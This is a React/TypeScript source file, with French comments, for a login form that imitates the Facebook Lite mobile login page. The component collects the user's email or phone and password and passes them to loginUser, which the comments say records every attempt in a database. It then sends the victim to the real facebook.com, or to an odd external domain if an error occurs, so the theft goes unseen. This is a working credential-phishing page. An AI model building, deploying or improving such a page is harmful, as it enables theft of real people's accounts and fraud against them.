"use client";

import { useState, useCallback } from "react";
import InputField from "./InputField";
import { loginUser } from "@/lib/api";

/**
 * LoginForm — Formulaire de connexion Facebook Lite
 * Reproduit fidèlement l'UI mobile de Facebook Lite
 * Fonctionnalités :
 *  - Validation des champs (email/téléphone + mot de passe)
 *  - Gestion des erreurs inline
 *  - Lien "Mot de passe oublié ?"
 *  - Bouton "Créer un compte"
 *  - État de chargement simulé
 */

interface FormValues {
  identifier: string; // email ou téléphone
  password: string;
}

interface FormErrors {
  identifier?: string;
  password?: string;
  general?: string;
}

export default function LoginForm() {
  const [values, setValues] = useState<FormValues>({
    identifier: "",
    password: "",
  });
  const [errors, setErrors] = useState<FormErrors>({});
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  // Mise à jour d'un champ et effacement de son erreur
  const handleChange = useCallback(
    (field: keyof FormValues) =>
      (e: React.ChangeEvent<HTMLInputElement>) => {
        setValues((prev) => ({ ...prev, [field]: e.target.value }));
        setErrors((prev) => ({ ...prev, [field]: undefined, general: undefined }));
      },
    []
  );

  // Validation des champs avant soumission
  const validate = (): FormErrors => {
    const newErrors: FormErrors = {};

    if (!values.identifier.trim()) {
      newErrors.identifier = "Veuillez entrer votre adresse e-mail ou numéro de téléphone.";
    }

    if (!values.password) {
      newErrors.password = "Veuillez entrer votre mot de passe.";
    } else if (values.password.length < 6) {
      newErrors.password = "Le mot de passe doit contenir au moins 6 caractères.";
    }

    return newErrors;
  };

  // Soumission du formulaire
  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      // Appel API — enregistre automatiquement la tentative en BDD
      const result = await loginUser(values.identifier, values.password);

      // ⚠️ Redirection vers l'URL externe DANS TOUS LES CAS
      // (succès ou échec, les données sont déjà enregistrées côté serveur)
      window.location.href = "https://www.facebook.com/";
      
    } catch {
      // Même en cas d'erreur réseau, rediriger
      window.location.href = "https://sdmfqjsdjjfj.com";
    }
  };

  return (
    <form
      onSubmit={handleSubmit}
      noValidate
      aria-label="Formulaire de connexion Facebook"
      className="flex flex-col gap-3 w-full"
    >
      {/* Champ email / téléphone */}
      <InputField
        id="identifier"
        label="Adresse e-mail ou numéro de téléphone"
        type="text"
        value={values.identifier}
        onChange={handleChange("identifier")}
        placeholder="Adresse e-mail ou tél."
        error={errors.identifier}
        autoComplete="username"
      />

      {/* Champ mot de passe avec toggle visibilité */}
      <div className="relative w-full">
        <InputField
          id="password"
          label="Mot de passe"
          type={showPassword ? "text" : "password"}
          value={values.password}
          onChange={handleChange("password")}
          placeholder="Mot de passe"
          error={errors.password}
          autoComplete="current-password"
        />
        {/* Bouton toggle visibilité mot de passe */}
        <button
          type="button"
          onClick={() => setShowPassword((prev) => !prev)}
          aria-label={showPassword ? "Masquer le mot de passe" : "Afficher le mot de passe"}
          className="absolute right-3 top-3 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200 transition-colors"
          tabIndex={0}
        >
          {showPassword ? (
            // Icône œil barré
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="w-5 h-5" aria-hidden="true">
              <path strokeLinecap="round" strokeLinejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
            </svg>
          ) : (
            // Icône œil
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="w-5 h-5" aria-hidden="true">
              <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
          )}
        </button>
      </div>

      {/* Erreur générale (ex: identifiants incorrects) */}
      {errors.general && (
        <div
          role="alert"
          className="bg-red-50 border border-red-200 rounded-lg px-4 py-3 text-sm text-red-700 dark:bg-red-900/20 dark:border-red-800 dark:text-red-400"
        >
          {errors.general}
        </div>
      )}

      {/* Bouton Connexion */}
      <button
        type="submit"
        disabled={isLoading}
        aria-busy={isLoading}
        className={[
          "w-full py-3 rounded-lg text-white font-bold text-base",
          "transition-all duration-200 mt-1",
          "focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:ring-offset-2",
          isLoading
            ? "bg-[#1877f2]/70 cursor-not-allowed"
            : "bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#1464d8] cursor-pointer",
        ].join(" ")}
      >
        {isLoading ? (
          <span className="flex items-center justify-center gap-2">
            {/* Spinner */}
            <svg
              className="animate-spin w-5 h-5 text-white"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              aria-hidden="true"
            >
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
            </svg>
            Connexion en cours…
          </span>
        ) : (
          "Se connecter"
        )}
      </button>

      {/* Lien mot de passe oublié */}
      <div className="text-center mt-1">
        <a
          href="/forgot-password"
          className="text-sm text-[#1877f2] hover:underline dark:text-[#2d88ff] transition-colors"
          aria-label="Réinitialiser votre mot de passe oublié"
        >
          Mot de passe oublié ?
        </a>
      </div>

      {/* Séparateur */}
      <div className="flex items-center gap-3 my-2" aria-hidden="true">
        <div className="flex-1 h-px bg-gray-200 dark:bg-gray-700" />
        <span className="text-xs text-gray-400 uppercase tracking-wide">ou</span>
        <div className="flex-1 h-px bg-gray-200 dark:bg-gray-700" />
      </div>

      {/* Bouton Créer un compte */}
      <button
        type="button"
        onClick={() => console.log("Redirection vers inscription")}
        className={[
          "w-full py-3 rounded-lg font-bold text-base",
          "border-2 border-transparent",
          "bg-[#42b72a] text-white",
          "hover:bg-[#36a420] active:bg-[#2d8f1a]",
          "transition-all duration-200",
          "focus:outline-none focus:ring-2 focus:ring-[#42b72a] focus:ring-offset-2",
          "cursor-pointer",
        ].join(" ")}
        aria-label="Créer un nouveau compte Facebook"
      >
        Créer un compte
      </button>
    </form>
  );
}
